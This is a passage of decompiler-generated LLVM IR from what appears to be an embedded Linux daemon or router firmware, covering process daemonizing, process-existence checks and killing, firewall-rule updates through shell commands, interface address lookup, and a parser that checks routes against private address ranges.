  br i1 %v1_4094fc, label %dec_label_pc_40951c, label %dec_label_pc_409500

dec_label_pc_409500:                              ; preds = %dec_label_pc_4094c8
  call void @exit(i32 -1)
  unreachable

dec_label_pc_40951c:                              ; preds = %dec_label_pc_4094c8
  %v3_409530 = call i32 @dup2(i32 %v5_4094e4, i32 0)
  %v3_409550 = call i32 @dup2(i32 %v5_4094e4, i32 1)
  %v3_409570 = call i32 @dup2(i32 %v5_4094e4, i32 2)
  %v1_409584 = icmp slt i32 %v5_4094e4, 3
  %v2_409584 = zext i1 %v1_409584 to i32
  br i1 %v1_409584, label %dec_label_pc_4095ac, label %dec_label_pc_40958c

dec_label_pc_40958c:                              ; preds = %dec_label_pc_40951c
  %v2_4095a0 = call i32 @close(i32 %v5_4094e4)
  br label %dec_label_pc_4095ac

dec_label_pc_4095ac:                              ; preds = %dec_label_pc_40951c, %dec_label_pc_40958c
  %v1_4095bc = phi i32 [ %v2_409584, %dec_label_pc_40951c ], [ %v2_4095a0, %dec_label_pc_40958c ]
  ret i32 %v1_4095bc

; uselistorder directives
  uselistorder i32 (i32)* @close, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder i32 (i8*, i32, ...)* @open, { 1, 0 }
  uselistorder i32 2, { 10, 4, 11, 12, 13, 9, 8, 5, 6, 7, 14, 1, 17, 2, 18, 3, 0, 15, 16 }
  uselistorder void (i32)* @exit, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_4092a8, { 1, 0 }
  uselistorder i32 13, { 2, 0, 3, 1, 4 }
  uselistorder i32 17, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 (i32)* @function_405774, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4095ac, { 1, 0 }
}

define i32 @proc_exists(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %tmp7 = bitcast i32* %stack_var_-192 to i8*
  %v8_409604 = call i32 (i8*, i8*, ...) @sprintf(i8* %tmp7, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_40aa24.181, i32 0, i32 0), i32 %arg1)
  %tmp8 = bitcast i32* %stack_var_-160 to %stat*
  %v7_40962c = call i32 @stat(i8* %tmp7, %stat* %tmp8)
  %v2_409640 = icmp eq i32 %v7_40962c, -1
  br i1 %v2_409640, label %dec_label_pc_409644, label %dec_label_pc_409670

dec_label_pc_409644:                              ; preds = %entry
  %v1_409654 = call i32* @__errno_location()
  br label %dec_label_pc_409670

dec_label_pc_409670:                              ; preds = %entry, %dec_label_pc_409644
  %storemerge = phi i32 [ 0, %dec_label_pc_409644 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %tmp7, { 1, 0 }
  uselistorder i32* ()* @__errno_location, { 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_409670, { 1, 0 }
}

define i32 @proc_kill(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_409688 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_409688, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %tmp19 = bitcast i32* %stack_var_-44 to i8*
  %v8_4096d0 = call i32 (i8*, i8*, ...) @sprintf(i8* %tmp19, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_40aa30.183, i32 0, i32 0), i32 %arg1)
  %v2_4096e4 = call i32 @os_exec(i8* %tmp19)
  %v1_4096f0 = icmp eq i32 %v2_4096e4, 0
  br i1 %v1_4096f0, label %dec_label_pc_40972c.preheader, label %dec_label_pc_4096f4

dec_label_pc_40972c.preheader:                    ; preds = %entry
  %v1_4097305 = call i32 @proc_exists(i32 %arg1)
  %v1_40973c6 = icmp eq i32 %v1_4097305, 0
  br i1 %v1_40973c6, label %dec_label_pc_4097b8, label %dec_label_pc_409740

dec_label_pc_4096f4:                              ; preds = %entry
  br label %dec_label_pc_4097bc

dec_label_pc_40970c:                              ; preds = %dec_label_pc_409740
  %v1_409710 = call i32 @th_sleep_s(i32 1)
  %v1_409724 = add i32 %stack_var_-48.07, -1
  %v3_40972c = load i32, i32* %stack_var_0, align 4
  %v1_409730 = call i32 @proc_exists(i32 %v3_40972c)
  %v1_40973c = icmp eq i32 %v1_409730, 0
  %v1_40975c = icmp eq i32 %v1_409724, 0
  br i1 %v1_40973c, label %dec_label_pc_409754, label %dec_label_pc_409740

dec_label_pc_409740:                              ; preds = %dec_label_pc_40972c.preheader, %dec_label_pc_40970c
  %v1_40975c8 = phi i1 [ %v1_40975c, %dec_label_pc_40970c ], [ false, %dec_label_pc_40972c.preheader ]
  %stack_var_-48.07 = phi i32 [ %v1_409724, %dec_label_pc_40970c ], [ 300, %dec_label_pc_40972c.preheader ]
  br i1 %v1_40975c8, label %dec_label_pc_409754.thread, label %dec_label_pc_40970c

dec_label_pc_409754.thread:                       ; preds = %dec_label_pc_409740
  br label %dec_label_pc_409760

dec_label_pc_409754:                              ; preds = %dec_label_pc_40970c
  br i1 %v1_40975c, label %dec_label_pc_409760, label %dec_label_pc_4097b8

dec_label_pc_409760:                              ; preds = %dec_label_pc_409754.thread, %dec_label_pc_409754
  %v3_409774 = load i32, i32* %stack_var_0, align 4
  %v8_409784 = call i32 (i8*, i8*, ...) @sprintf(i8* %tmp19, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40aa38.184, i32 0, i32 0), i32 %v3_409774)
  %v2_409798 = call i32 @os_exec(i8* %tmp19)
  %v1_4097a4 = icmp eq i32 %v2_409798, 0
  br i1 %v1_4097a4, label %dec_label_pc_4097b8, label %dec_label_pc_4097a8

dec_label_pc_4097a8:                              ; preds = %dec_label_pc_409760
  br label %dec_label_pc_4097bc

dec_label_pc_4097b8:                              ; preds = %dec_label_pc_40972c.preheader, %dec_label_pc_409754, %dec_label_pc_409760
  br label %dec_label_pc_4097bc

dec_label_pc_4097bc:                              ; preds = %dec_label_pc_4097a8, %dec_label_pc_4096f4, %dec_label_pc_4097b8
  %v1_4097cc = phi i32 [ 0, %dec_label_pc_4097a8 ], [ 0, %dec_label_pc_4096f4 ], [ 1, %dec_label_pc_4097b8 ]
  ret i32 %v1_4097cc

; uselistorder directives
  uselistorder i8* %tmp19, { 2, 1, 3, 0 }
  uselistorder i1 false, { 1, 10, 7, 11, 4, 12, 8, 13, 9, 14, 3, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 5, 26, 27, 2, 6 }
  uselistorder i32 (i32)* @proc_exists, { 1, 0 }
  uselistorder label %dec_label_pc_4097bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4097b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_409760, { 1, 0 }
  uselistorder label %dec_label_pc_409740, { 1, 0 }
}

define i32 @function_4097d4(i8* %arg1) local_unnamed_addr {
dec_label_pc_4097d4:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %v2_4097d4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_4097d4, i32* @fp, align 4
  %tmp7 = bitcast i32* %stack_var_-136 to i8*
  %v10_409814 = call i32 (i8*, i8*, ...) @sprintf(i8* %tmp7, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_40aa44.185, i32 0, i32 0), i8* %arg1)
  %v2_409828 = call i32 @os_exec(i8* %tmp7)
  %v1_409834 = icmp eq i32 %v2_409828, 0
  br i1 %v1_409834, label %dec_label_pc_409848, label %dec_label_pc_40985c

dec_label_pc_409848:                              ; preds = %dec_label_pc_4097d4
  %v1_40984c = call i32 @th_sleep_s(i32 1)
  br label %dec_label_pc_40985c

dec_label_pc_40985c:                              ; preds = %dec_label_pc_4097d4, %dec_label_pc_409848
  %storemerge = phi i32 [ 1, %dec_label_pc_409848 ], [ 0, %dec_label_pc_4097d4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %tmp7, { 1, 0 }
  uselistorder i32 (i32)* @th_sleep_s, { 1, 0 }
  uselistorder i32 (i8*, i8*, ...)* @sprintf, { 2, 5, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_40985c, { 1, 0 }
}

define i32 @ipt_update(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_8 = alloca i32, align 4
  %stack_var_-528 = alloca i8*, align 4
  %stack_var_-552 = alloca i32, align 4
  %v2_409874 = ptrtoint i32* %stack_var_-552 to i32
  %v0_40987c = load i32, i32* @fp, align 4
  store i32 %v2_409874, i32* @fp, align 4
  %v0_409894 = load i32, i32* @a2, align 4
  store i32 %v0_409894, i32* %stack_var_8, align 4
  store i8* inttoptr (i32 1635020905 to i8*), i8** %stack_var_-528, align 4
  %v2_4098c8 = ptrtoint i8** %stack_var_-528 to i32
  %tmp16 = bitcast i8** %stack_var_-528 to i8*
  %v7_4098e0 = call i8* @strcat(i8* %tmp16, i8* %arg1)
  %v2_4098ec = ptrtoint i32* %stack_var_8 to i32
  %v4_409908 = call i32 @strlen(i8* %tmp16)
  %v2_409918 = add i32 %v4_409908, %v2_4098c8
  %v1_409920 = inttoptr i32 %v2_409918 to i8*
  store i32 %v2_4098ec, i32* @a2, align 4
  %v8_409938 = call i32 @vsprintf(i8* %v1_409920, i8* %tmp, i32 %v2_4098ec)
  %v2_40994c = call i32 @os_exec(i8* %tmp16)
  %v1_409958 = icmp eq i32 %v2_40994c, 0
  %. = zext i1 %v1_409958 to i32
  store i32 %v0_40987c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_4098ec, { 1, 0 }
  uselistorder i8* %tmp16, { 1, 2, 0 }
  uselistorder i32* %stack_var_8, { 1, 0 }
  uselistorder i32 (i8*)* @strlen, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 1, 2 }
}

define i32 @function_409988() local_unnamed_addr {
dec_label_pc_409988:
  %stack_var_-40 = alloca i32, align 4
  %v2_409988 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_409988, i32* @fp, align 4
  br label %dec_label_pc_4099a4

dec_label_pc_4099a4:                              ; preds = %dec_label_pc_409988, %dec_label_pc_4099a4
  %storemerge13 = phi i32 [ 0, %dec_label_pc_409988 ], [ %v1_4099dc, %dec_label_pc_4099a4 ]
  %v1_4099b0 = mul i32 %storemerge13, 4
  %v2_4099b8 = add i32 %v1_4099b0, ptrtoint ([8 x i8*]* @global_var_41b0d0.123 to i32)
  %v1_4099bc = inttoptr i32 %v2_4099b8 to i32*
  %v2_4099bc = load i32, i32* %v1_4099bc, align 4
  %v4_4099cc = call i32 @ipt_update(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_40a8f4.125, i32 0, i32 0), i32 %v2_4099bc)
  %v1_4099dc = add nuw nsw i32 %storemerge13, 1
  %v1_4099ec = icmp slt i32 %v1_4099dc, 8
  br i1 %v1_4099ec, label %dec_label_pc_4099a4, label %dec_label_pc_409a44.preheader

dec_label_pc_409a44.preheader:                    ; preds = %dec_label_pc_4099a4
  br label %dec_label_pc_409a04

dec_label_pc_409a04:                              ; preds = %dec_label_pc_409a44.preheader, %dec_label_pc_409a04
  %storemerge2 = phi i32 [ 0, %dec_label_pc_409a44.preheader ], [ %v1_409a3c, %dec_label_pc_409a04 ]
  %v1_409a10 = mul i32 %storemerge2, 4
  %v2_409a18 = add i32 %v1_409a10, ptrtoint ([8 x i8*]* @global_var_41b0d0.123 to i32)
  %v1_409a1c = inttoptr i32 %v2_409a18 to i32*
  %v2_409a1c = load i32, i32* %v1_409a1c, align 4
  %v4_409a2c = call i32 @ipt_update(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_40a8ec.124, i32 0, i32 0), i32 %v2_409a1c)
  %v1_409a3c = add nuw nsw i32 %storemerge2, 1
  %v1_409a4c = icmp slt i32 %v1_409a3c, 8
  br i1 %v1_409a4c, label %dec_label_pc_409a04, label %dec_label_pc_409a54

dec_label_pc_409a54:                              ; preds = %dec_label_pc_409a04
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0 }
  uselistorder i32 8, { 12, 13, 9, 3, 10, 4, 5, 14, 0, 15, 16, 17, 18, 7, 6, 8, 19, 20, 21, 22, 1, 23, 24, 25, 2, 11 }
  uselistorder i32 ptrtoint ([8 x i8*]* @global_var_41b0d0.123 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_409a04, { 1, 0 }
  uselistorder label %dec_label_pc_4099a4, { 1, 0 }
}

define i32 @function_409a70(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_409a70:
  %stack_var_0 = alloca i8*, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-26 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_409a70 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_409a70, i32* @fp, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v1_409aa4 = icmp eq i8* %arg1, null
  br i1 %v1_409aa4, label %dec_label_pc_409aa8, label %dec_label_pc_409ab8

dec_label_pc_409aa8:                              ; preds = %dec_label_pc_409a70
  br label %dec_label_pc_409be4

dec_label_pc_409ab8:                              ; preds = %dec_label_pc_409a70
  %v3_409ac0 = call i32 @sock_open(i32 3, i32* null)
  store i32 %v3_409ac0, i32* %stack_var_-12, align 4
  %v1_409ad8 = icmp sgt i32 %v3_409ac0, -1
  br i1 %v1_409ad8, label %dec_label_pc_409aec, label %dec_label_pc_409adc

dec_label_pc_409adc:                              ; preds = %dec_label_pc_409ab8
  br label %dec_label_pc_409be4

dec_label_pc_409aec:                              ; preds = %dec_label_pc_409ab8
  %v5_409b08 = call i32* @memset(i32* nonnull %stack_var_-44, i32 0, i32 32)
  %tmp14 = bitcast i32* %stack_var_-44 to i8*
  %v3_409b1c = load i8*, i8** %stack_var_0, align 4
  %v7_409b2c = call i8* @strcpy(i8* %tmp14, i8* %v3_409b1c)
  %v3_409b58 = call i32 (i32, i32, ...) @ioctl(i32 %v3_409ac0, i32 35111)
  %v1_409b64 = icmp eq i32 %v3_409b58, 0
  br i1 %v1_409b64, label %dec_label_pc_409b68, label %dec_label_pc_409bcc

dec_label_pc_409b68:                              ; preds = %dec_label_pc_409aec
  %v4_409b8c = inttoptr i32 %arg2 to i32*
  %v6_409b8c = call i32* @memcpy(i32* %v4_409b8c, i32* nonnull %stack_var_-26, i32 6)
  %v3_409b98 = load i8*, i8** %stack_var_0, align 4
  %v4_409ba8 = call i32 @if_nametoindex(i8* %v3_409b98)
  %v2_409bc0 = inttoptr i32 %arg3 to i32*
  store i32 %v4_409ba8, i32* %v2_409bc0, align 4
  br label %dec_label_pc_409bcc

dec_label_pc_409bcc:                              ; preds = %dec_label_pc_409aec, %dec_label_pc_409b68
  %stack_var_-48.0 = phi i32 [ 1, %dec_label_pc_409b68 ], [ 0, %dec_label_pc_409aec ]
  %v2_409bd4 = call i32 @sock_close_and_invalidate(i32* nonnull %stack_var_-12)
  br label %dec_label_pc_409be4

dec_label_pc_409be4:                              ; preds = %dec_label_pc_409adc, %dec_label_pc_409aa8, %dec_label_pc_409bcc
  %v1_409bf4 = phi i32 [ 0, %dec_label_pc_409adc ], [ 0, %dec_label_pc_409aa8 ], [ %stack_var_-48.0, %dec_label_pc_409bcc ]
  ret i32 %v1_409bf4

; uselistorder directives
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i8** %stack_var_0, { 2, 1, 0 }
  uselistorder i32 (i32*)* @sock_close_and_invalidate, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32* (i32*, i32*, i32)* @memcpy, { 3, 2, 1, 0 }
  uselistorder i32 6, { 2, 3, 4, 7, 6, 5, 0, 8, 1, 9 }
  uselistorder i8* (i8*, i8*)* @strcpy, { 3, 0, 2, 1 }
  uselistorder i32* (i32*, i32, i32)* @memset, { 14, 13, 12, 11, 5, 10, 9, 1, 8, 7, 0, 6, 3, 4, 2 }
  uselistorder i32* null, { 10, 11, 0, 12, 13, 1, 14, 15, 2, 3, 4, 16, 17, 5, 18, 19, 20, 21, 6, 22, 23, 7, 8, 24, 9 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_409be4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_409bcc, { 1, 0 }
}

define i32 @function_409bfc(i8* %arg1) local_unnamed_addr {
dec_label_pc_409bfc:
  %stack_var_0 = alloca i8*, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v1_409c2c = icmp eq i8* %arg1, null
  br i1 %v1_409c2c, label %dec_label_pc_409fd4, label %dec_label_pc_409c40

dec_label_pc_409c40:                              ; preds = %dec_label_pc_409bfc
  %v3_409c44 = load i32, i32* @global_var_434370.113, align 4
  %v1_409c50 = inttoptr i32 %v3_409c44 to i32*
  %v2_409c50 = call i32 @mtx_lock(i32* %v1_409c50)
  %v7_409c78 = call %_IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_40aa60.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a9a4.134, i32 0, i32 0))
  %v1_409c90 = icmp eq %_IO_FILE* %v7_409c78, null
  br i1 %v1_409c90, label %dec_label_pc_409fb4, label %dec_label_pc_409c94

dec_label_pc_409c94:                              ; preds = %dec_label_pc_409c40
  %v2_409c98 = ptrtoint i32* %stack_var_-268 to i32
  %tmp66 = bitcast i32* %stack_var_-268 to i8*
  %v8_409cb4 = call i8* @fgets(i8* %tmp66, i32 256, %_IO_FILE* nonnull %v7_409c78)
  br label %dec_label_pc_409f64.lr.ph

dec_label_pc_409cc8:                              ; preds = %dec_label_pc_409f64.lr.ph, %dec_label_pc_409f50.backedge
  store i32 -1, i32* %stack_var_-276, align 4
  store i32 0, i32* %stack_var_-272, align 4
  %v2_409cfc4 = load i8, i8* %tmp66, align 4
  %v1_409d046 = icmp eq i8 %v2_409cfc4, 0
  br i1 %v1_409d046, label %dec_label_pc_409d9c, label %dec_label_pc_409d08

dec_label_pc_409ce4:                              ; preds = %dec_label_pc_409d80
  %v1_409cec = add i32 %v4_409cf48, 1
  %v5_409cf0 = inttoptr i32 %v1_409cec to i8*
  %v2_409cfc = load i8, i8* %v5_409cf0, align 1
  %v1_409d04 = icmp eq i8 %v2_409cfc, 0
  br i1 %v1_409d04, label %dec_label_pc_409d9c, label %dec_label_pc_409d08

dec_label_pc_409d08:                              ; preds = %dec_label_pc_409cc8, %dec_label_pc_409ce4
  %v4_409cf48 = phi i32 [ %v1_409cec, %dec_label_pc_409ce4 ], [ %v2_409c98, %dec_label_pc_409cc8 ]
  %stack_var_-284.07 = phi i8* [ %v5_409cf0, %dec_label_pc_409ce4 ], [ %tmp66, %dec_label_pc_409cc8 ]
  %v2_409d14 = load i8, i8* %stack_var_-284.07, align 1
  %v2_409d1c = icmp eq i8 %v2_409d14, 32
  br i1 %v2_409d1c, label %dec_label_pc_409d9c, label %dec_label_pc_409d20

dec_label_pc_409d20:                              ; preds = %dec_label_pc_409d08
  %v2_409d2c = load i8, i8* %stack_var_-284.07, align 1
  %v2_409d34 = icmp eq i8 %v2_409d2c, 10
  br i1 %v2_409d34, label %dec_label_pc_409d9c, label %dec_label_pc_409d38

dec_label_pc_409d38:                              ; preds = %dec_label_pc_409d20
  %v2_409d44 = load i8, i8* %stack_var_-284.07, align 1
  %v2_409d4c = icmp eq i8 %v2_409d44, 9
  br i1 %v2_409d4c, label %dec_label_pc_409d9c, label %dec_label_pc_409d50

dec_label_pc_409d50:                              ; preds = %dec_label_pc_409d38
  %v2_409d5c = load i8, i8* %stack_var_-284.07, align 1
  %v2_409d64 = icmp eq i8 %v2_409d5c, 11
  br i1 %v2_409d64, label %dec_label_pc_409d9c, label %dec_label_pc_409d68

dec_label_pc_409d68:                              ; preds = %dec_label_pc_409d50
  %v2_409d74 = load i8, i8* %stack_var_-284.07, align 1
  %v2_409d7c = icmp eq i8 %v2_409d74, 12
  br i1 %v2_409d7c, label %dec_label_pc_409d9c, label %dec_label_pc_409d80

dec_label_pc_409d80:                              ; preds = %dec_label_pc_409d68
  %v2_409d8c = load i8, i8* %stack_var_-284.07, align 1
  %v2_409d94 = icmp eq i8 %v2_409d8c, 13
  br i1 %v2_409d94, label %dec_label_pc_409d9c, label %dec_label_pc_409ce4

dec_label_pc_409d9c:                              ; preds = %dec_label_pc_409ce4, %dec_label_pc_409d08, %dec_label_pc_409d20, %dec_label_pc_409d38, %dec_label_pc_409d50, %dec_label_pc_409d68, %dec_label_pc_409d80, %dec_label_pc_409cc8
  %stack_var_-284.0.lcssa = phi i8* [ %tmp66, %dec_label_pc_409cc8 ], [ %v5_409cf0, %dec_label_pc_409ce4 ], [ %stack_var_-284.07, %dec_label_pc_409d08 ], [ %stack_var_-284.07, %dec_label_pc_409d20 ], [ %stack_var_-284.07, %dec_label_pc_409d38 ], [ %stack_var_-284.07, %dec_label_pc_409d50 ], [ %stack_var_-284.07, %dec_label_pc_409d68 ], [ %stack_var_-284.07, %dec_label_pc_409d80 ]
  %v4_409cf4.lcssa = phi i32 [ %v2_409c98, %dec_label_pc_409cc8 ], [ %v1_409cec, %dec_label_pc_409ce4 ], [ %v4_409cf48, %dec_label_pc_409d08 ], [ %v4_409cf48, %dec_label_pc_409d20 ], [ %v4_409cf48, %dec_label_pc_409d38 ], [ %v4_409cf48, %dec_label_pc_409d50 ], [ %v4_409cf48, %dec_label_pc_409d68 ], [ %v4_409cf48, %dec_label_pc_409d80 ]
  %v2_409da4 = sub i32 %v4_409cf4.lcssa, %v2_409c98
  %v3_409dac = load i8*, i8** %stack_var_0, align 4
  %v8_409dc4 = call i8* @strncpy(i8* %v3_409dac, i8* %tmp66, i32 %v2_409da4)
  %v4_409ddc = ptrtoint i8* %v3_409dac to i32
  %v2_409de4 = add i32 %v4_409ddc, %v2_409da4
  %v1_409de8 = inttoptr i32 %v2_409de4 to i8*
  store i8 0, i8* %v1_409de8, align 1
  %v4_409e0422 = ptrtoint i8* %stack_var_-284.0.lcssa to i32
  %v2_409e0c23 = load i8, i8* %stack_var_-284.0.lcssa, align 1
  %v1_409e1425 = icmp eq i8 %v2_409e0c23, 0
  br i1 %v1_409e1425, label %dec_label_pc_409eac, label %dec_label_pc_409e18

dec_label_pc_409df4:                              ; preds = %dec_label_pc_409e90, %dec_label_pc_409e78, %dec_label_pc_409e60, %dec_label_pc_409e48, %dec_label_pc_409e30, %dec_label_pc_409e18
  %v1_409dfc = add i32 %v4_409e0427, 1
  %v5_409e00 = inttoptr i32 %v1_409dfc to i8*
  %v2_409e0c = load i8, i8* %v5_409e00, align 1
  %v1_409e14 = icmp eq i8 %v2_409e0c, 0
  br i1 %v1_409e14, label %dec_label_pc_409eac, label %dec_label_pc_409e18

dec_label_pc_409e18:                              ; preds = %dec_label_pc_409d9c, %dec_label_pc_409df4
  %v4_409e0427 = phi i32 [ %v1_409dfc, %dec_label_pc_409df4 ], [ %v4_409e0422, %dec_label_pc_409d9c ]
  %stack_var_-284.126 = phi i8* [ %v5_409e00, %dec_label_pc_409df4 ], [ %stack_var_-284.0.lcssa, %dec_label_pc_409d9c ]
  %v2_409e24 = load i8, i8* %stack_var_-284.126, align 1
  %v2_409e2c = icmp eq i8 %v2_409e24, 32
  br i1 %v2_409e2c, label %dec_label_pc_409df4, label %dec_label_pc_409e30

dec_label_pc_409e30:                              ; preds = %dec_label_pc_409e18
  %v2_409e3c = load i8, i8* %stack_var_-284.126, align 1
  %v2_409e44 = icmp eq i8 %v2_409e3c, 10
  br i1 %v2_409e44, label %dec_label_pc_409df4, label %dec_label_pc_409e48

dec_label_pc_409e48:                              ; preds = %dec_label_pc_409e30
  %v2_409e54 = load i8, i8* %stack_var_-284.126, align 1
  %v2_409e5c = icmp eq i8 %v2_409e54, 9
  br i1 %v2_409e5c, label %dec_label_pc_409df4, label %dec_label_pc_409e60

dec_label_pc_409e60:                              ; preds = %dec_label_pc_409e48
  %v2_409e6c = load i8, i8* %stack_var_-284.126, align 1
  %v2_409e74 = icmp eq i8 %v2_409e6c, 11
  br i1 %v2_409e74, label %dec_label_pc_409df4, label %dec_label_pc_409e78

dec_label_pc_409e78:                              ; preds = %dec_label_pc_409e60
  %v2_409e84 = load i8, i8* %stack_var_-284.126, align 1
  %v2_409e8c = icmp eq i8 %v2_409e84, 12
  br i1 %v2_409e8c, label %dec_label_pc_409df4, label %dec_label_pc_409e90

dec_label_pc_409e90:                              ; preds = %dec_label_pc_409e78
  %v2_409e9c = load i8, i8* %stack_var_-284.126, align 1
  %v2_409ea4 = icmp eq i8 %v2_409e9c, 13
  br i1 %v2_409ea4, label %dec_label_pc_409df4, label %dec_label_pc_409eac

dec_label_pc_409eac:                              ; preds = %dec_label_pc_409df4, %dec_label_pc_409e90, %dec_label_pc_409d9c
  %stack_var_-284.1.lcssa = phi i8* [ %stack_var_-284.0.lcssa, %dec_label_pc_409d9c ], [ %v5_409e00, %dec_label_pc_409df4 ], [ %stack_var_-284.126, %dec_label_pc_409e90 ]
  %v11_409ed4 = call i32 (i8*, i8*, ...) @sscanf(i8* %stack_var_-284.1.lcssa, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_40aa70.195, i32 0, i32 0), i32* nonnull %stack_var_-276, i32* nonnull %stack_var_-272)
  %v3_409ee0 = load i32, i32* %stack_var_-276, align 4
  %v1_409ee8 = icmp eq i32 %v3_409ee0, 0
  br i1 %v1_409ee8, label %dec_label_pc_409eec, label %dec_label_pc_409f50.backedge

dec_label_pc_409eec:                              ; preds = %dec_label_pc_409eac
  %v3_409ef0 = load i32, i32* %stack_var_-272, align 4
  %v1_409ef8 = icmp eq i32 %v3_409ef0, 0
  br i1 %v1_409ef8, label %dec_label_pc_409f50.backedge, label %dec_label_pc_409f08

dec_label_pc_409f50.backedge:                     ; preds = %dec_label_pc_409eec, %dec_label_pc_409eac, %dec_label_pc_409f08
  %v8_409f84 = call i8* @fgets(i8* %tmp66, i32 256, %_IO_FILE* nonnull %v7_409c78)
  %v1_409f90 = icmp eq i8* %v8_409f84, null
  br i1 %v1_409f90, label %dec_label_pc_409f98, label %dec_label_pc_409cc8

dec_label_pc_409f08:                              ; preds = %dec_label_pc_409eec
  %v2_409f10 = and i32 %v3_409ef0, -16777216
  %v2_409f18 = icmp eq i32 %v2_409f10, 167772160
  br i1 %v2_409f18, label %dec_label_pc_409f50.backedge, label %dec_label_pc_409f28

dec_label_pc_409f28:                              ; preds = %dec_label_pc_409f08
  %v2_409f30 = and i32 %v3_409ef0, -65536
  %v2_409f38 = icmp eq i32 %v2_409f30, -1062731776
  %stack_var_-288.0. = select i1 %v2_409f38, i8 %stack_var_-288.0.ph35, i8 1
  %v1_409f60 = icmp eq i8 %stack_var_-288.0., 1
  br i1 %v1_409f60, label %dec_label_pc_409f98, label %dec_label_pc_409f64.lr.ph

dec_label_pc_409f64.lr.ph:                        ; preds = %dec_label_pc_409c94, %dec_label_pc_409f28
  %stack_var_-288.0.ph35 = phi i8 [ 0, %dec_label_pc_409c94 ], [ %stack_var_-288.0., %dec_label_pc_409f28 ]
  %v8_409f8470 = call i8* @fgets(i8* %tmp66, i32 256, %_IO_FILE* nonnull %v7_409c78)
  %v1_409f9072 = icmp eq i8* %v8_409f8470, null
  br i1 %v1_409f9072, label %dec_label_pc_409f98, label %dec_label_pc_409cc8

dec_label_pc_409f98:                              ; preds = %dec_label_pc_409f28, %dec_label_pc_409f64.lr.ph, %dec_label_pc_409f50.backedge
  %stack_var_-288.0.ph.lcssa = phi i8 [ %stack_var_-288.0.ph35, %dec_label_pc_409f50.backedge ], [ %stack_var_-288.0.ph35, %dec_label_pc_409f64.lr.ph ], [ %stack_var_-288.0., %dec_label_pc_409f28 ]
  %v3_409f9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32468) to i32*), align 4
  call void @__pseudo_call(i32 %v3_409f9c)
  br label %dec_label_pc_409fb4

dec_label_pc_409fb4:                              ; preds = %dec_label_pc_409c40, %dec_label_pc_409f98
  %stack_var_-288.1 = phi i8 [ 0, %dec_label_pc_409c40 ], [ %stack_var_-288.0.ph.lcssa, %dec_label_pc_409f98 ]
  %v3_409fb8 = load i32, i32* @global_var_434370.113, align 4
  %v1_409fc4 = inttoptr i32 %v3_409fb8 to i32*
  %v2_409fc4 = call i32 @mtx_unlock(i32* %v1_409fc4)
  br label %dec_label_pc_409fd4

dec_label_pc_409fd4:                              ; preds = %dec_label_pc_409bfc, %dec_label_pc_409fb4
  %storemerge.in = phi i8 [ %stack_var_-288.1, %dec_label_pc_409fb4 ], [ 0, %dec_label_pc_409bfc ]
  %storemerge = zext i8 %storemerge.in to i32
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %stack_var_-288.0., { 1, 2, 0 }
  uselistorder i8* %stack_var_-284.126, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i8* %stack_var_-284.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-284.07, { 0, 1, 2, 3, 4, 5, 11, 10, 9, 8, 7, 6 }
